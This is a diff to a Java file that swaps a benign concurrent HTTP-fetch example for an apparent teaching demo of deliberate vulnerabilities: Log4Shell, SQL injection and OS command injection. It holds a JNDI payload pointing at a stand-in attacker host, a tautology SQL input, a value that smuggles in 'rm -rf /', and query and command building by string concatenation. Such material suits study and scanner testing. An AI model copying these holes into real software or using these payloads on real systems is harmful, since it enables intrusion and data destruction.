@@ -1,102 +1,78 @@
 package com.example;
 
-import java.io.IOException;
-import java.net.URI;
-import java.net.http.HttpClient;
-import java.net.http.HttpRequest;
-import java.net.http.HttpResponse;
-import java.time.Duration;
-import java.util.List;
-import java.util.concurrent.CompletableFuture;
-import java.util.concurrent.ExecutorService;
-import java.util.concurrent.Executors;
-import java.util.stream.Collectors;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.sql.Connection;
+import java.sql.DriverManager;
+import java.sql.ResultSet;
+import java.sql.Statement;
 
 public class App {
 
-    // Dedicated thread pool for managed asynchronous tasks
-    private static final ExecutorService EXECUTOR = Executors.newFixedThreadPool(4);
-    
-    // Modern HTTP Client with timeout configurations
-    private static final HttpClient HTTP_CLIENT = HttpClient.newBuilder()
-            .connectTimeout(Duration.ofSeconds(10))
-            .build();
+    // VULNERABILITY: Using a vulnerable logging framework version (Log4Shell)
+    private static final Logger logger = LogManager.getLogger(App.class);
 
     public static void main(String[] args) {
-        System.out.println("[⚡] Starting Enterprise Data Processor Application...\n");
+        System.out.println("[⚠️] Starting App with Intentional Vulnerabilities...\n");
 
-        // Mock list of URLs to process concurrently
-        List<String> targetUrls = List.of(
-            "https://typicode.com",
-            "https://typicode.com",
-            "https://typicode.com"
-        );
+        // Simulating untrusted user inputs
+        String maliciousLogInput = "${jndi:ldap://://evil-server.com}";
+        String maliciousQueryInput = "admin' OR '1'='1";
+        String maliciousCommandInput = "local-ping; rm -rf /"; 
 
-        try {
-            // Initiate parallel asynchronous tasks
-            List<CompletableFuture<String>> futures = targetUrls.stream()
-                .map(url -> CompletableFuture.supplyAsync(() -> fetchAndProcessData(url), EXECUTOR))
-                .collect(Collectors.toList());
+        // 1. Log4Shell Demonstration
+        // Logging user-controlled strings directly allows JNDI lookups in this Log4j version
+        logger.info("Processing user input: " + maliciousLogInput);
 
-            // Combine all futures into a single execution blocker
-            CompletableFuture<Void> allTasks = CompletableFuture.allOf(futures.toArray(new CompletableFuture[0]));
-            
-            // Wait for all HTTP fetches and processing to complete
-            allTasks.join();
-            
-            System.out.println("\n[✓] All data processing jobs completed successfully.");
-        } catch (Exception e) {
-            System.err.println("[X] Critical application failure: " + e.getMessage());
-        } finally {
-            // Gracefully shut down the custom thread pool
-            EXECUTOR.shutdown();
-        }
+        // 2. SQL Injection Demonstration
+        executeVulnerableQuery(maliciousQueryInput);
+
+        // 3. Command Injection Demonstration
+        executeVulnerableCommand(maliciousCommandInput);
     }
 
     /**
-     * Fetches raw JSON string from a target endpoint and logs the localized thread action.
+     * VULNERABILITY: SQL Injection
+     * Direct string concatenation allows an attacker to alter the SQL command structure.
      */
-    private static String fetchAndProcessData(String url) {
-        String threadName = Thread.currentThread().getName();
-        System.out.printf("[Job] Thread %s is initiating fetch for: %s%n", threadName, url);
-
-        HttpRequest request = HttpRequest.newBuilder()
-                .uri(URI.create(url))
-                .header("Accept", "application/json")
-                .GET()
-                .build();
-
-        try {
-            HttpResponse<String> response = HTTP_CLIENT.send(request, HttpResponse.BodyHandlers.ofString());
+    private static void executeVulnerableQuery(String userInput) {
+        String url = "jdbc:h2:mem:test;DB_CLOSE_DELAY=-1";
+        try (Connection conn = DriverManager.getConnection(url, "sa", "");
+             Statement stmt = conn.createStatement()) {
             
-            if (response.statusCode() == 200) {
-                String body = response.body();
-                // Extracting basic elements using standard string manipulation to mimic parsing
-                String parsedTitle = extractJsonField(body, "title");
-                System.out.printf("[Success] Thread %s parsed Title: -> \"%s\"%n", threadName, parsedTitle);
-                return body;
-            } else {
-                System.err.printf("[Error] Thread %s received HTTP Code %d from %s%n", threadName, response.statusCode(), url);
+            // Faulty practice: concatenation instead of PreparedStatement
+            String query = "SELECT * FROM users WHERE username = '" + userInput + "' AND password = 'password'";
+            System.out.println("[Executing SQL]: " + query);
+            
+            ResultSet rs = stmt.executeQuery(query);
+            while (rs.next()) {
+                System.out.println("User found: " + rs.getString("username"));
             }
-        } catch (IOException | InterruptedException e) {
-            System.err.printf("[Exception] Thread %s failed on %s. Detail: %s%n", threadName, url, e.getMessage());
-            Thread.currentThread().interrupt();
+        } catch (Exception e) {
+            System.err.println("SQL Error: " + e.getMessage());
         }
-        return "";
     }
 
     /**
-     * Helper method to grab a JSON key's string value without external libraries.
+     * VULNERABILITY: OS Command Injection
+     * Passing unsanitized user inputs into a system shell executor.
      */
-    private static String extractJsonField(String json, String fieldName) {
-        String keyMarker = "\"" + fieldName + "\":";
-        int keyIndex = json.indexOf(keyMarker);
-        if (keyIndex == -1) return "Unknown";
-        
-        int valueStart = json.indexOf("\"", keyIndex + keyMarker.length()) + 1;
-        int valueEnd = json.indexOf("\"", valueStart);
-        
-        if (valueStart <= 0 || valueEnd == -1) return "Unknown";
-        return json.substring(valueStart, valueEnd);
+    private static void executeVulnerableCommand(String userInput) {
+        // Faulty practice: Constructing OS commands natively with user variables
+        String command = "ping -c 1 " + userInput;
+        System.out.println("[Executing OS Command]: " + command);
+
+        try {
+            Process process = Runtime.getRuntime().exec(command);
+            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+            String line;
+            while ((line = reader.readLine()) != null) {
+                System.out.println(line);
+            }
+        } catch (Exception e) {
+            System.err.println("Command Executive Error: " + e.getMessage());
+        }
     }
 }
